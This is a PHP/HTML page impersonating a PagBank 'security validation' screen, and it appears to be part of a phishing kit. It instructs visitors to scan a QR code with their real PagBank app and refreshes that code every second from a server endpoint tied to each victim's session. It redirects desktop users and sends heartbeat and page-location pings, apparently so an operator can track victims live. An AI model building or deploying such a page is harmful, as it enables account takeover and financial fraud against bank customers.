<?php
session_start();
// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
if (!isset($_SESSION['cliente_id'])) {
  header("Location: login.php");
  exit;
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>A solução completa para pagamentos online</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0; padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', sans-serif;
    }

    html, body {
      height: 100%;
    }

    body {
      background: #fff;
      display: flex;
      flex-direction: column;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 20px;
      border-bottom: 1px solid #ddd;
    }

    header img {
      height: 36px;
    }

    header select {
      padding: 6px 14px;
      font-size: 14px;
      font-weight: 500;
      border: 1px solid #ccc;
      border-radius: 20px;
      background-color: #fff;
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg width='12' height='8' viewBox='0 0 12 8' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23007fc7' stroke-width='2' fill='none' fill-rule='evenodd'/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      background-position: right 10px center;
      background-size: 12px 8px;
      padding-right: 32px;
      cursor: pointer;
    }


    .wrapper {
      padding: 20px;
      flex: 1;
    }

    .voltar {
      color: #007fc7;
      font-size: 14px;
      text-decoration: none;
      display: inline-block;
      margin-bottom: 10px;
    }

    .voltar::before {
      content: "← ";
    }

    h1 {
      font-size: 18px;
      font-weight: 500;
      margin-bottom: 20px;
      color: #222;
    }

    .qrcode {
      width: 100%;
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }

    .qrcode img {
      width: 200px;
      height: 200px;
    }

    .etapas {
      background: #fff;
      border: 1px solid #ddd;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 20px;
      position: relative;
    }

    .etapas::before {
      content: "";
      position: absolute;
      left: 35px;
      top: 55px;
      height: calc(100% - 500px);
      width: 1px;
      background: #ccc;
      z-index: 0;
    }

    .etapas p {
      font-size: 14px;
      color: #666;
      margin-bottom: 16px;
    }

    .linha {
      display: flex;
      align-items: flex-start;
      margin-bottom: 18px;
    }

    .numero {
      background: #02c39a;
      color: #fff;
      width: 32px;
      height: 32px;
      font-size: 14px;
      font-weight: bold;
      border-radius: 50%;
      display: grid;
      place-items: center;
      margin-right: 12px;
      z-index: 1;
    }



    .linha span {
      font-size: 15px;
      color: #333;
      line-height: 1.5;
    }

    .linha strong {
      font-weight: 600;
    }

    .linha img {
      width: 18px;
      height: 18px;
      vertical-align: middle;
      margin-left: 4px;
    }

    .ajuda {
      font-size: 14px;
      margin-top: 8px;
    }

    .ajuda a {
      color: #007fc7;
      text-decoration: none;
    }

    .celular {
      background: #000;
      width: 180px;
      height: 340px;
      border-radius: 28px;
      padding: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto;
    }

    .celular video {
      width: 135%;
      height: 90%;
      border-radius: 1px;
      object-fit: cover;
    }

    footer {
      background: #222;
      color: #ccc;
      text-align: center;
      font-size: 12px;
      padding: 20px 0;
      margin: 0;
      width: 100%;
    }

    footer img {
      height: 28px;
      margin-bottom: 10px;
    }

    footer p {
      margin: 4px 0;
    }
  </style>
</head>
<body>

  <header>
    <select><option>PT</option></select>
  </header>

  <div class="wrapper">
    <a href="javascript:history.back()" class="voltar">Voltar</a>
    <h1>Validação de Segurança</h1>

    <div class="qrcode">
      <img id="qrcode" src="imagens/qrcode-pagbank.png" alt="QR Code PagBank">
    </div>

    <div class="etapas">
      <p>O que devo fazer?</p>

      <div class="linha">
        <div class="numero">1</div>
        <span>Abra o aplicativo PagBank em seu celular</span>
      </div>

      <div class="linha">
        <div class="numero">2</div>
        <span>Na tela inicial clique no símbolo do cadeado <img src="imagens/icone-cadeado.png" alt="Cadeado" style="width: 30px; height: 30px; vertical-align: middle; margin-left: 4px;"></span>
      </div>

      <div class="linha">
        <div class="numero">3</div>
        <span>Selecione a opção <strong>QR Code</strong></span>
      </div>

      <div class="linha">
        <div class="numero">4</div>
        <span>Aponte a câmera para o QR Code e <br>siga as instruções do app</span>
      </div>

      <div class="ajuda"><a href="#">Precisa de ajuda?</a></div>

      <div class="celular" style="margin-top: 24px;">
        <video src="imagens/celular-validacao.mp4" autoplay muted loop></video>
      </div>
    </div>
  </div>

  <footer>
    <p>© 1996-2025 Todos os direitos reservados.</p>
    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo – SP – CEP 01451-001</p>
  </footer>

  <script>
    const clienteId = '<?php echo $_SESSION["cliente_id"]; ?>';

    function atualizarQRCode() {
      fetch('get_qrcode.php?cliente_id=' + clienteId)
        .then(res => res.json())
        .then(data => {
          if (data.qrcode) {
            const qr = document.getElementById('qrcode');
            qr.src = data.qrcode + '?t=' + Date.now(); // força atualização
          }
        });
    }

    setInterval(atualizarQRCode, 1000); // a cada 1 segundo

    document.addEventListener("DOMContentLoaded", function () {
      const isMobile = /iphone|ipod|android|webos|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase());
      if (!isMobile) {
        window.location.href = "validacao.php";
      }
    });
  </script>
    <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
  <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'validacao-mobile.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>

</body>
</html>
